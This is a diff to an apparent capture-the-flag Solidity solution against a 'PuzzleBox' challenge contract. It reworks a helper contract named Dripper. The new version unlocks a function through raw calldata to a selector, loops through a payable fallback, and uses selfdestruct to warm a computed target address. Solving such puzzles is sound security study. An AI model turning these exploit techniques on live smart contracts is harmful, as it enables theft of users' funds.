@@ -27,7 +27,6 @@ contract PuzzleBoxSolution {
     function _drip(PuzzleBox puzzle) private {
         Dripper dripper = new Dripper(puzzle);
         address(dripper).call("");
-        dripper.destroy();
     }
 
     function _torch(PuzzleBox puzzle) private {
@@ -91,23 +90,26 @@ contract PuzzleBoxSolution {
 
 contract Dripper {
     PuzzleBox private immutable _puzzle;
+    address payable private immutable _target;
 
     constructor(PuzzleBox puzzle) {
         _puzzle = puzzle;
+        _target = payable(address(uint160(address(_puzzle)) + 2));
 
         // operate drip
         puzzle.operate();
 
         // unlock torch
-        PuzzleBoxProxy(payable(address(puzzle))).lock(PuzzleBox.torch.selector, false); // ??? wtf
-    }
-
-    function destroy() public {
-        // create and warm zip target address
-        selfdestruct(payable(address(uint160(address(_puzzle)) + 2)));
+        address(puzzle).call( // puzzle.lock(PuzzleBox.torch.selector, false);
+            hex"deecedd4"
+            hex"925facb100000000000000000000000000000000000000000000000000000000"
+            hex"0000000000000000000000000000000000000000000000000000000000000000"
+        ); // ??? wtf
     }
 
     fallback() external payable {
-        _puzzle.drip{value: msg.value == 0 ? 1000 : msg.value}();
+        // puzzle.drip{value: msg.value == 0 ? 1000 : msg.value}();
+        address(_puzzle).call{value: msg.value == 0 ? 1000 : msg.value}(hex"9f678cca");
+        if (msg.value == 0) selfdestruct(_target);
     }
 }
